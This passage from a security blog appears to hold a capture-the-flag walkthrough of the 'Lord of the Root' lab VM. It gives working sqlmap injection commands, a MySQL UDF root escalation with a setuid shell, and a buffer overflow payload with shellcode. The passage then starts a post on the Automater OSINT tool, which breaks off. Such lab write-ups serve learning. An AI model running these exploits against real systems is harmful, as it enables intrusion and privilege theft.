<p>I checked it out in the browser, and found this image:</p>

<p><img class="center" src="/images/pentest/lordoftheroot/willdo.jpeg" title="&lsquo;mordor&rsquo; &lsquo;take the ring to mordor&rsquo;" ></p>

<p>Ran exiftool and strings on the picture, didn&rsquo;t find anything. Next I went to the <em>/images</em> directory where the image was served from, and found 2 more. Downloaded them and put them through exiftool and strings, still no results. In the meantime, I had also fired up a directory bruteforce on the server, but that didn&rsquo;t get me anywhere either. So the next thing I tried was to see if there is a directory called smeagol on the web server. There wasn&rsquo;t, but I was presented this picture, one of the 3 images found:</p>

<p><img class="center" src="/images/pentest/lordoftheroot/hipster.jpg" title="&lsquo;hipster&rsquo; &lsquo;hipster&rsquo;" ></p>

<p>Further testing confirmed that this image acted as a 404 page. But when I looked at the source, I found a suspicious string in a comment:</p>

<p>```</p>

<!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh>
```

I put the string into a [multipurpose online decoder](https://encoder.mattiasgeniar.be/index.php) and got a base64 string out of it: <code>Lzk3ODM0NTIxMC9pbmRleC5waHA=</code>. Decoding it revealed a directory on the web server: <code>/978345210/index.php</code>. Going there, I found a login page!

<img class="center" src="/images/pentest/lordoftheroot/mordor.png" title="mordor" alt="mordor login">

Time for sqlmap! I had to play with it and tweak quite a bit, the default levels didn't report any injection vulnerability, and the scan took so long, I had to break the enumeration into manageable pieces:

``` 
sqlmap -u "http://192.168.217.136:1337/978345210/index.php" --method POST -o --level=5 --risk=3 --dbms=MySQL -p username --data="username=smeagol&password=precious&submit=+Login+" --current-db
```

First, I queried for the current DB in use. I also turned on all the optimizaton switches, raised testing levels, and started with the username parameter. And luckily, it was vulnerable:

``` 
current database:    'Webapp'
```

Next, I dumped the discovered database:

``` 
sqlmap -u "http://192.168.217.136:1337/978345210/index.php" --method POST -o --level=5 --risk=3 --dbms=MySQL -p username --data="username=smeagol&password=precious&submit=+Login+" -D Webapp --dump
[...]
Database: Webapp
Table: Users
[5 entries]
+----+----------+------------------+
| id | username | password         |
+----+----------+------------------+
| 1  | frodo    | iwilltakethering |
| 2  | smeagol  | MyPreciousR00t   |
| 3  | aragorn  | AndMySword       |
| 4  | legolas  | AndMyBow         |
| 5  | gimli    | AndMyAxe         |
+----+----------+------------------+
```

Now that I had usernames and passwords, it was time to test them on SSH! I started with smeagol, because it looked slightly different than the others :-) And I got in:

``` 
smeagol@LordOfTheRoot:~$ uname -a
Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
```

So, especially for older machines, one of the first things I do is check the kernel version. Googling it actually yielded a [privilege escalation exploit](https://www.exploit-db.com/exploits/39166/) right away. I decided to save this approach for last, because the exploit wasn't known at the time of the VM release. Instead, I proceeded to some more conventional enumeration.


I downloaded my [linux_privcheck](https://github.com/chousensha/linux_privcheck) tool with <code>wget https://raw.githubusercontent.com/chousensha/linux_privcheck/master/privinfo.py</code> and ran it on the machine while I ate a lasagna. Then I combed through the output (note to self: I have to revisit my script and make improvements to it, will get to it). The interesting tidbits that I observed were:

``` 
root      1174     1  0 08:15 ?        00:00:08 /usr/sbin/mysqld
```

MySQL running as root! Definitely on to something there, as we could get root credentials from SQLi. The other thing I found were some setuid binaries in a suspicious folder:

``` 
/SECRET/door2/file
/SECRET/door1/file
/SECRET/door3/file
```

The machine description on VulnHub stated that there are 2 methods for gaining privilege escalation..and here we are with 2 possible venues of attack! Let's take them in order!

## Privilege escalation method #1 - via MySQL

With MySQL running as root, we can use [a UDF and a setuid binary to gain a root shell](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/). At the core of this exploit is the fact that a User Defined Function can be evaluated as SQL code to run commands in the context of the MySQL process, which is root in this case. As I was reading through the article, it became clear that root credentials would be needed for the database server. So I went back to sqlmap, and this time added the switches <code>--users</code> and <code>--passwords</code>:

``` 
database management system users [5]:
[*] 'debian-sys-maint'@'localhost'
[*] 'root'@'127.0.0.1'
[*] 'root'@'::1'
[*] 'root'@'localhost'
[*] 'root'@'lordoftheroot'

database management system users password hashes:
[*] debian-sys-maint [1]:
    password hash: *A55A9B9049F69BC2768C9284615361DFBD580B34
[*] root [1]:
    password hash: *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F
```

I used an online cracker for the root hash, and the cracked password was *darkshadow*. Then I connected to the MySQL database:

``` 
smeagol@LordOfTheRoot:~$ mysql -u root -p 
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1829
Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```


Next, I followed the steps of the [infamoussyn article](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/), which are really well explained. UDF files need to be [locally compiled and installed on the server host](https://dev.mysql.com/doc/refman/5.7/en/udf-compiling.html), and a special directory is required for that..

- Find the location where MySQL looks for shared object files, identified by the <code>plugin_dir</code> variable:

``` 
mysql> show variables like "plugin_dir";
+---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/ |
+---------------+------------------------+
1 row in set (0.00 sec)
```

The required directory is found at <code>/usr/lib/mysql/plugin/</code>. This is where we'll put our UDF object files.

- Now it's time to compile the object file. The exploit that allows privilege escalation is called[raptor_udf2.c](https://www.exploit-db.com/exploits/1518/). I downloaded it to the compromised machine, and followed the instructions in the source code to compile it:

``` 
gcc -g -c raptor_udf2.c
```

If you are lost in the myriad of GCC options from its manpage, there is a cool page offering [options summary](https://gcc.gnu.org/onlinedocs/gcc/Option-Summary.html) in a way that lets you jump to whatever interests you. Here, I compiled the C file without linking, and with debugging information. This produced an object file called <code>raptor_udf2.o</code>. 

- Next, you create a shared library and link it:

``` 
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

If you copy from the source code, you have to change the 1 in *-W1* to a lowercase l, otherwise you get an error. Here's a [good resource](http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html) to help you untangle the above command. Now you should also have in your directory a shared object called <code>raptor_udf2.so</code>.

- Now you create a table inside MySQL and insert the shared object contents. Switch to the mysql DB:

``` 
mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

Create table:

``` 
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.03 sec)
```

Load your .so file:

``` 
mysql> insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));
Query OK, 1 row affected (0.01 sec)
```

- Copy the .so file to the plugin directory:

``` 
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.05 sec)
```

- Now you can create the UDF:

``` 
mysql> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
1 row in set (0.00 sec)
```

- Confirm that it works:

``` 
mysql> select do_system('id > /tmp/out; chown smeagol.smeagol /tmp/out');
+------------------------------------------------------------+
| do_system('id > /tmp/out; chown smeagol.smeagol /tmp/out') |
+------------------------------------------------------------+
|                                                          0 |
+------------------------------------------------------------+
1 row in set (0.01 sec)

mysql> \! cat /tmp/out
uid=0(root) gid=0(root) groups=0(root)
```

Note that you can use *\\!* to run commands from within the MySQL shell.

- Finally, we want to gain a real root shell. A setuid shell is ideal for this. I placed the following C code inside a file called shell.c:

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

I used MySQL to compile it:

``` 
mysql> select do_system("gcc -o /tmp/ring /home/smeagol/shell.c");
+-----------------------------------------------------+
| do_system("gcc -o /tmp/ring /home/smeagol/shell.c") |
+-----------------------------------------------------+
|                                                   0 |
+-----------------------------------------------------+
1 row in set (0.15 sec)
```

Now set the SUID bit:

``` 
mysql> select do_system("chmod u+s /tmp/ring");
+----------------------------------+
| do_system("chmod u+s /tmp/ring") |
+----------------------------------+
|                                0 |
+----------------------------------+
1 row in set (0.01 sec)
```

I looked inside /tmp for confirmation:

``` 
smeagol@LordOfTheRoot:~$ ls -l /tmp/
total 12
-rw-rw---- 1 smeagol smeagol   39 Jun 14 04:06 out
-rwsrwx--x 1 root    root    7410 Jun 14 04:16 ring
```

Lastly, I dropped to a shell with <code>\\! sh</code>, and ran the newly created binary:

``` 
$ /tmp/ring
root@LordOfTheRoot:~# cat /root/Flag.txt 
“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
– Gandalf
```

Inside root's directory I also found source code for the binaries that will supply the second method of exploitation. And a Python script that moves them around, just like in the Tr0ll 2 challenge..

## Privilege escalation method #2 - Binary exploitation

So, I previously looked at the source code of the binaries inside the SECRET folder, and I know one of them is vulnerable to buffer overflow. Need to find which one:

``` 
smeagol@LordOfTheRoot:/SECRET$ ls -la *
door1:
total 16
drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
-rwsr-xr-x 1 root root 7370 Sep 17  2015 file

door2:
total 16
drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
-rwsr-xr-x 1 root root 5150 Sep 22  2015 file

door3:
total 16
drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
-rwsr-xr-x 1 root root 7370 Sep 17  2015 file
```

Let's see each of them:

``` 
door1/file 
Syntax: door1/file <input string>
```

I went through them, and determined that the vulnerable binary is the one with size 5150.

``` 
./file $(python -c 'print "A" * 200')
Segmentation fault (core dumped)
```

I copied the binary to /tmp, so I could work on it without the interference of the moving script. Normally, it's GDB time, but I want to expand my tools coverage, and I noticed in other writeups the mention of PEDA, or [Python Exploit Development Assistance for GDB](https://github.com/longld/peda), which adds cool features and colorizes the display. So I figured I'd give it a try, and downloaded it to the target and installed it:

``` 
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

If you want to see what PEDA can do, run <code>peda help</code> to see all available commands:

``` 
gdb-peda$ peda help
PEDA - Python Exploit Development Assistance for GDB
For latest update, check peda project page: https://github.com/longld/peda/
List of "peda" subcommands, type the subcommand to invoke it:
aslr -- Show/set ASLR setting of GDB
asmsearch -- Search for ASM instructions in memory
assemble -- On the fly assemble and execute instructions using NASM
checksec -- Check for various security options of binary
cmpmem -- Compare content of a memory region with a file
context -- Display various information of current execution context
context_code -- Display nearby disassembly at $PC of current execution context
context_register -- Display register information of current execution context
context_stack -- Display stack of current execution context
crashdump -- Display crashdump info and save to file
deactive -- Bypass a function by ignoring its execution (eg sleep/alarm)
distance -- Calculate distance between two addresses
dumpargs -- Display arguments passed to a function when stopped at a call instruction
dumpmem -- Dump content of a memory region to raw binary file
dumprop -- Dump all ROP gadgets in specific memory range
eflags -- Display/set/clear/toggle value of eflags register
elfheader -- Get headers information from debugged ELF file
elfsymbol -- Get non-debugging symbol information from an ELF file
gennop -- Generate abitrary length NOP sled using given characters
getfile -- Get exec filename of current debugged process
getpid -- Get PID of current debugged process
goto -- Continue execution at an address
help -- Print the usage manual for PEDA commands
hexdump -- Display hex/ascii dump of data in memory
hexprint -- Display hexified of data in memory
jmpcall -- Search for JMP/CALL instructions in memory
loadmem -- Load contents of a raw binary file to memory
lookup -- Search for all addresses/references to addresses which belong to a memory range
nearpc -- Disassemble instructions nearby current PC or given address
nextcall -- Step until next 'call' instruction in specific memory range
nextjmp -- Step until next 'j*' instruction in specific memory range
nxtest -- Perform real NX test to see if it is enabled/supported by OS
patch -- Patch memory start at an address with string/hexstring/int
pattern -- Generate, search, or write a cyclic pattern to memory
pattern_arg -- Set argument list with cyclic pattern
pattern_create -- Generate a cyclic pattern
pattern_env -- Set environment variable with a cyclic pattern
pattern_offset -- Search for offset of a value in cyclic pattern
pattern_patch -- Write a cyclic pattern to memory
pattern_search -- Search a cyclic pattern in registers and memory
payload -- Generate various type of ROP payload using ret2plt
pdisass -- Format output of gdb disassemble command with colors
pltbreak -- Set breakpoint at PLT functions match name regex
procinfo -- Display various info from /proc/pid/
profile -- Simple profiling to count executed instructions in the program
pyhelp -- Wrapper for python built-in help
readelf -- Get headers information from an ELF file
refsearch -- Search for all references to a value in memory ranges
reload -- Reload PEDA sources, keep current options untouch
ropgadget -- Get common ROP gadgets of binary or library
ropsearch -- Search for ROP gadgets in memory
searchmem -- Search for a pattern in memory; support regex search
session -- Save/restore a working gdb session to file as a script
set -- Set various PEDA options and other settings
sgrep -- Search for full strings contain the given pattern
shellcode -- Generate or download common shellcodes.
show -- Show various PEDA options and other settings
skeleton -- Generate python exploit code template
skipi -- Skip execution of next count instructions
snapshot -- Save/restore process's snapshot to/from file
start -- Start debugged program and stop at most convenient entry
stepuntil -- Step until a desired instruction in specific memory range
strings -- Display printable strings in memory
substr -- Search for substrings of a given string/number in memory
telescope -- Display memory content at an address with smart dereferences
tracecall -- Trace function calls made by the program
traceinst -- Trace specific instructions executed by the program
unptrace -- Disable anti-ptrace detection
utils -- Miscelaneous utilities from utils module
vmmap -- Get virtual mapping address ranges of section(s) in debugged process
waitfor -- Try to attach to new forked process; mimic "attach -waitfor"
xinfo -- Display detail information of address/registers
xormem -- XOR a memory region with a key
xprint -- Extra support to GDB's print command
xrefs -- Search for all call/data access references to a function/variable
xuntil -- Continue execution until an address or function

Type "help" followed by subcommand for full documentation.
```

It's time to run the binary! With Peda, you can create patterns just like with the Metasploit utilities:

``` 
gdb-peda$ peda help pattern
Generate, search, or write a cyclic pattern to memory
Set "pattern" option for basic/extended pattern type
Usage:
    pattern create size [file]
    pattern offset value
    pattern search
    pattern patch address size
    pattern arg size1 [size2,offset2]
    pattern env size[,offset]
gdb-peda$ pattern create 200 test
Writing pattern of 200 chars to filename "test"
```

<img class="center" src="/images/pentest/lordoftheroot/peda.png" title="peda" alt="segfault in peda">

I wanted to show a screenshot instead of the code, so you can also see the colors that make the output much more readable. You can see that EIP has been overwritten with the value 0x57414174. I searched for it in the pattern:

``` 
gdb-peda$ pattern search 0x57414174
Registers contain pattern buffer:
EBP+0 found at offset: 167
EIP+0 found at offset: 171
Registers point to pattern buffer:
[ESP] -->


<p> offset 175 &ndash; size ~25
Pattern buffer found at:
0xbffff571 : offset    0 &ndash; size  200 ($sp + -0xaf [-44 dwords])
0xbffff7f8 : offset    0 &ndash; size  200 ($sp + 0x1d8 [118 dwords])
References to pattern buffer found at:
0xbffff550 : 0xbffff571 ($sp + -0xd0 [-52 dwords])
0xbffff560 : 0xbffff571 ($sp + -0xc0 [-48 dwords])
0xbffff564 : 0xbffff7f8 ($sp + -0xbc [-47 dwords])
0xbffff6b8 : 0xbffff7f8 ($sp + 0x98 [38 dwords])
```</p>

<p>The reported offset is 171. Verified it really quick:</p>

<p><code>
gdb-peda$ r $(python -c 'print "A" * 171 + "B" * 4 + "C" * 4')
[...]
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff640 ("CCCC")
EIP: 0x42424242 ('BBBB')
</code></p>

<p>Alright, now we need some shellcode. I decided to use Peda for all the exploitation phases, so I could showcase more of its functionality. First, I looked at the options:</p>

<p>```
gdb-peda$ peda help shellcode
Generate or download common shellcodes.
Usage:</p>

<pre><code>shellcode generate [arch/]platform type [port] [host]
shellcode search keyword (use % for any character wildcard)
shellcode display shellcodeId (shellcodeId as appears in search results)
shellcode zsc [generate customize shellcode]

For generate option:
    default port for bindport shellcode: 16706 (0x4142)
    default host/port for connect back shellcode: 127.127.127.127/16706
    supported arch: x86
</code></pre>

<p>```</p>

<p>Next I searched for some execve shellcode, and settled for the below:</p>

<p><code>
[841]   Linux/x86 - Tiny Execve sh Shellcode - 21 bytes
</code></p>

<p>Let&rsquo;s see what I got here:</p>

<p>```
gdb-peda$ shellcode display 841
Connecting to shell-storm.org&hellip;</p>

<p>/*</p>

<p> Tiny Execve sh Shellcode &ndash; C Language &ndash; Linux/x86
 Copyright &copy; 2013 Geyslan G. Bem, Hacking bits</p>

<p>   <a href="http://hackingbits.com">http://hackingbits.com</a>
   <a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#x3a;&#103;&#101;&#121;&#x73;&#x6c;&#97;&#x6e;&#x40;&#103;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#x6d;">&#103;&#x65;&#121;&#x73;&#108;&#97;&#x6e;&#64;&#103;&#x6d;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#x6d;</a></p>

<p> This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.</p>

<p> This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.</p>

<p> You should have received a copy of the GNU General Public License
 along with this program.  If not, see <a href="http://www.gnu.org/licenses/">http://www.gnu.org/licenses/</a></p>

<p>*/</p>

<p>/*</p>

<p>   tiny_execve_sh_shellcode</p>

<ul>
<li>21 bytes</li>
<li>null-free</li>
</ul>


<p>   # gcc -m32 -fno-stack-protector -z execstack tiny_execve_sh_shellcode.c -o tiny_execve_sh_shellcode</p>

<p>   Testing
   # ./tiny_execve_sh_shellcode</p>

<p>*/</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>unsigned char shellcode[] = \</p>

<p>&ldquo;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f&rdquo;
&ldquo;\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd&rdquo;
&ldquo;\x80&rdquo;;</p>

<p>main ()
{</p>

<pre><code>    // When contains null bytes, printf will show a wrong shellcode length.

printf("Shellcode Length:  %d\n", strlen(shellcode));

// Pollutes all registers ensuring that the shellcode runs in any circumstance.

__asm__ ("movl $0xffffffff, %eax\n\t"
     "movl %eax, %ebx\n\t"
     "movl %eax, %ecx\n\t"
     "movl %eax, %edx\n\t"
     "movl %eax, %esi\n\t"
     "movl %eax, %edi\n\t"
     "movl %eax, %ebp\n\t"

     // Calling the shellcode
     "call shellcode");
</code></pre>

<p>}
```</p>

<p>Ok, the shellcode is <code>\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</code>. Next we need the address of ESP, so we know where to store our shellcode. Then we can have a full payload, where we point EIP to the contents of ESP, and the shellcode gets executed.</p>

<p>```
gdb-peda$ context stack</p>

<p>[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;stack&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
0000| 0xbffff640 (&ldquo;CCCC&rdquo;)
0004| 0xbffff644 &mdash;> 0xbffff600 (&lsquo;A&rsquo; <repeats 60 times>, &ldquo;BBBBCCCC&rdquo;)
0008| 0xbffff648 &mdash;> 0xbffff6e0 &mdash;> 0xbffff8c1 (&ldquo;XDG_SESSION_ID=1&rdquo;)
0012| 0xbffff64c &mdash;> 0xb7feccea (&lt;call_init+26>:    add    ebx,0x12316)
0016| 0xbffff650 &mdash;> 0x2
0020| 0xbffff654 &mdash;> 0xbffff6d4 &mdash;> 0xbffff803 (&ldquo;/tmp/file&rdquo;)
0024| 0xbffff658 &mdash;> 0xbffff674 &mdash;> 0x658f7063
0028| 0xbffff65c &mdash;> 0x804974c &mdash;> 0xb7e2f990 (&lt;__libc_start_main>: push   ebp)
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
```</p>

<p>So ESP is located at 0xbffff640. Or so I thought..when I ran my payload, I got another segfault and the address of ESP was different. I didn&rsquo;t expect something like ASLR to be enabled, but when I checked, it actually is:</p>

<p><code>
cat /proc/sys/kernel/randomize_va_space
2
</code></p>

<p>I checked with <em>ldd</em>:</p>

<p>```
smeagol@LordOfTheRoot:/tmp$ ldd file</p>

<pre><code>linux-gate.so.1 =&gt;  (0xb773d000)
libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7576000)
/lib/ld-linux.so.2 (0xb773f000)
</code></pre>

<p>smeagol@LordOfTheRoot:/tmp$ ldd file</p>

<pre><code>linux-gate.so.1 =&gt;  (0xb770c000)
libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7545000)
/lib/ld-linux.so.2 (0xb770e000)
</code></pre>

<p>```</p>

<p>After some googling, I found a <a href="https://www.exploit-db.com/exploits/39669/">trick to disable ASLR</a>. On a vulnerable 32 bit system, ASLR doesn&rsquo;t always randomize the mmap base address when the stack size is set to unlimited. I verified that it works:</p>

<p>```
smeagol@LordOfTheRoot:/tmp$ ulimit -s unlimited
smeagol@LordOfTheRoot:/tmp$ ldd file</p>

<pre><code>linux-gate.so.1 =&gt;  (0x40024000)
libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x4003d000)
/lib/ld-linux.so.2 (0x40000000)
</code></pre>

<p>smeagol@LordOfTheRoot:/tmp$ ldd file</p>

<pre><code>linux-gate.so.1 =&gt;  (0x40024000)
libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x4003d000)
/lib/ld-linux.so.2 (0x40000000)
</code></pre>

<p>```</p>

<p>I tweaked the exploit again, but I still couldn&rsquo;t hit on a valid ESP address. In the end, I used Peda to help me locate a <em>jmp esp</em> address:</p>

<p><code>
gdb-peda$ jmpcall esp
Not found
gdb-peda$ jmpcall esp libc
0x4003ea85 : jmp esp
</code></p>

<p>Adjusted the exploit again, and it worked:</p>

<p><code>
gdb-peda$ r $(python -c 'print "A" * 171 + "\x85\xea\x03\x40" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
Starting program: /tmp/file $(python -c 'print "A" * 171 + "\x85\xea\x03\x40" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
process 5184 is executing new program: /bin/dash
$ whoami
[New process 5187]
process 5187 is executing new program: /usr/bin/whoami
smeagol
$ [Inferior 2 (process 5187) exited normally]
Warning: not running or target is remote
</code></p>

<p>To gain root, we need to exploit the real suid binary:</p>

<p>```
smeagol@LordOfTheRoot:/SECRET/door2$ ./file $(python -c &lsquo;print &ldquo;A&rdquo; * 171 + &ldquo;\x85\xea\x03\x40&rdquo; + &ldquo;\x90&rdquo; * 2000 + &ldquo;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&rdquo;&rsquo;)</p>

<h1>whoami</h1>

<p>root
```</p>

<h2>Privilege escalation method #3 &ndash; kernel exploit</h2>

<p>Lastly, we&rsquo;re back to the <a href="https://www.exploit-db.com/exploits/39166">overlayfs exploit</a>. It&rsquo;s just a matter of download, compile, run:</p>

<p><code>
smeagol@LordOfTheRoot:/tmp$ ./overlay
root@LordOfTheRoot:/tmp# whoami
root
</code></p>

<p>We owned Mordor! This was such an interesting challenge, learned many new things! Thanks to KookSec for this!</p>

<h4>Learn more</h4>

<ul>
<li><p><a href="https://www.exploit-db.com/papers/13030/">ASLR bypassing</a></p></li>
<li><p><a href="http://ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf">Linux Interactive Exploit Development with GDB and PEDA</a></p></li>
<li><p><a href="https://www.exploit-db.com/exploits/39669/">disable ASLR trick</a></p></li>
</ul>


<p>Will leave you with this:</p>

<p><img class="center" src="/images/pentest/lordoftheroot/legolas.jpg" title="&lsquo;legolas&rsquo; &lsquo;legolas&rsquo;" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Automater - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/11/automater-kali-linux-tools/"/>
    <updated>2017-06-11T03:57:26-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/11/automater-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: you want to check suspicious IPs, domains and hashes for maliciousness. Maybe you&rsquo;ve heard that your favorite news site has been hacked and is serving malware to its users. You&rsquo;d like to confirm if something is dangerous or not, without navigating to it and risking to get compromised in the process. There is a Python tool on Kali that can help you with just that! Enter Automater!</p>

<!-- more -->


<p>Homepage: <a href="http://www.tekdefense.com/automater/">http://www.tekdefense.com/automater/</a></p>

<p>If you want to get it on your distro, you can grab it from its <a href="https://github.com/1aN0rmus/TekDefense-Automater">Github repository</a></p>

<h1>Automater description</h1>

<blockquote><p>Automater is a URL/Domain, IP Address, and Md5 Hash OSINT tool aimed at making the analysis process easier for
intrusion Analysts. Given a target (URL, IP, or HASH) or a file full of targets Automater will return relevant
results from sources like the following: IPvoid.com, Robtex.com, Fortiguard.com, unshorten.me, Urlvoid.com,
Labs.alienvault.com, ThreatExpert, VxVault, and VirusTotal.</p></blockquote>

<h1>Automater options</h1>

<p>```
automater -h
usage: Automater.py [-h] [-o OUTPUT] [-b] [-f CEF] [-w WEB] [-c CSV]</p>

<pre><code>                [-d DELAY] [-s SOURCE] [--proxy PROXY] [-a USERAGENT] [-V]
                [-r] [-v]
                target
</code></pre>

<p>IP, URL, and Hash Passive Analysis tool</p>

<p>positional arguments:
  target                List one IP Address (CIDR or dash notation accepted),</p>

<pre><code>                    URL or Hash to query or pass the filename of a file
                    containing IP Address info, URL or Hash to query each
                    separated by a newline.
</code></pre>

<p>optional arguments:
  -h, &mdash;help            show this help message and exit
  -o OUTPUT, &mdash;output OUTPUT</p>

<pre><code>                    This option will output the results to a file.
</code></pre>

<p>  -b, &mdash;bot             This option will output minimized results for a bot.
  -f CEF, &mdash;cef CEF     This option will output the results to a CEF formatted</p>

<pre><code>                    file.
</code></pre>

<p>  -w WEB, &mdash;web WEB     This option will output the results to an HTML file.
  -c CSV, &mdash;csv CSV     This option will output the results to a CSV file.
  -d DELAY, &mdash;delay DELAY</p>

<pre><code>                    This will change the delay to the inputted seconds.
                    Default is 2.
</code></pre>

<p>  -s SOURCE, &mdash;source SOURCE</p>

<pre><code>                    This option will only run the target against a
                    specific source engine to pull associated domains.
                    Options are defined in the name attribute of the site
                    element in the XML configuration file. This can be a
                    list of names separated by a semicolon.
</code></pre>

<p>  &mdash;proxy PROXY         This option will set a proxy to use (eg.</p>

<pre><code>                    proxy.example.com:8080)
</code></pre>

<p>  -a USERAGENT, &mdash;useragent USERAGENT</p>

<pre><code>                    This option allows the user to set the user-agent seen
                    by web servers being utilized. By default, the user-
                    agent is set to Automater/version
</code></pre>

<p>  -V, &mdash;vercheck        This option checks and reports versioning for</p>

<pre><code>                    Automater. Checks each python module in the Automater
                    scope. Default, (no -V) is False
</code></pre>

<p>  -r, &mdash;refreshxml      This option refreshes the tekdefense.xml file from the</p>

<pre><code>                    remote GitHub site. Default (no -r) is False.
</code></pre>

<p>  -v, &mdash;verbose         This option prints messages to the screen. Default (no</p>

<pre><code>                    -v) is False.
</code></pre>

<p>```</p>

<p>You can see there are multiple output options for further processing, like CEF formatted file, CSV and HTML. Also, it&rsquo;s important to remember that tools usually come with their default user agents, and it might be beneficial to change this when you run it, and make it look like a real browser.</p>

<h1>Automater usage</h1>

<ul>
<li>check IP for malware</li>
</ul>


<p>```
automater 185.62.190.110
